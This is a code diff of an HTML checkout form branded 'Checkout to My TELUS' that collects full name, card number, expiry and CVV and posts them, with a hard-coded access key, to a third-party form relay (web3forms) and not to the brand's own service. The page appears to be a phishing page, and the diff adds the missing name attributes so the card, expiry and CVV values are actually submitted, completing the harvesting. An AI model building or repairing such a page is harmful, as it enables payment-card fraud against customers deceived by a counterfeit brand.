@@ -264,29 +264,33 @@
 
 <body>
     <form id="my-form" action="https://api.web3forms.com/submit" method="POST">
-        <div class="form-box">
-            <h2>Checkout to My TELUS</h2>
-            <input type="hidden" name="access_key" value="5783b12d-b368-45c8-879d-ae1855d069b1">
-            <div class="input-group">
-                <input type="text" id="text" name="message" required>
-                <label>Full legal Name</label>
-            </div>
-            <div class="input-group">
-                <input type="text" id="cardNumber card" maxlength="19" required>
-                <label for="card">Card Number</label>
-            </div>
-            <div class="input-group">
-                <input type="text" id="expiry" maxlength="5" required>
-                <label>Expiry</label>
-            </div>
-            <div class="input-group">
-                <input type="text" id="cvv" maxlength="3" required>
-                <label>CVV</label>
-            </div>
+    <div class="form-box">
+        <h2>Checkout to My TELUS</h2>
+        <input type="hidden" name="access_key" value="5783b12d-b368-45c8-879d-ae1855d069b1">
 
-            <button class="login19" id="my-form-button">Complete Order</button>
+        <div class="input-group">
+            <input type="text" id="fullName" name="fullName" required>
+            <label for="fullName">Full Legal Name</label>
         </div>
-    </form>
+
+        <div class="input-group">
+            <input type="text" id="cardNumber" name="cardNumber" maxlength="19" required>
+            <label for="cardNumber">Card Number</label>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY" required>
+            <label for="expiry">Expiry</label>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="cvv" name="cvv" maxlength="3" required>
+            <label for="cvv">CVV</label>
+        </div>
+
+        <button class="login19" id="my-form-button">Complete Order</button>
+    </div>
+</form>
     <div class="sc-dcJsrY iifIdT"><img data-testid="telus-leaves-image"
             src="//images.ctfassets.net/reduo6gvn7wu/5gOJ6Sp0vs6flsxB33a8gr/fa393fe54b875e03e5d29dab5e6f79e0/leaves.webp"
             width="1588" alt="" loading="eager" style="height: 0px; max-width: 100%;"></div>
